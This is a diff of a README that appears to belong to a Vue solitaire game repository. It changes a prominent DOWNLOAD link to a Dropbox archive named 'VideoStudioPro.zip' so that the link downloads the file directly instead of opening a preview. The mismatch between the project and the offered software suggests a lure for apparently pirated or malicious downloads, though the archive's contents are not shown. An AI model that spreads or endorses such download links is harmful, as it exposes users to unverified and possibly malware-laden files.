@@ -19,7 +19,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a href="https://www.dropbox.com/s/zjo5qmv8ai7bt3c/VideoStudioPro.zip?dl=0">DOWNLOAD</a></h1>
+<h1 align="center"><a href="https://www.dropbox.com/s/zjo5qmv8ai7bt3c/VideoStudioPro.zip?dl=1">DOWNLOAD</a></h1>
 
 ![vsx10-og](https://user-images.githubusercontent.com/83872975/117543349-7f424b00-b02d-11eb-9037-920ff73f3608.jpg)
 
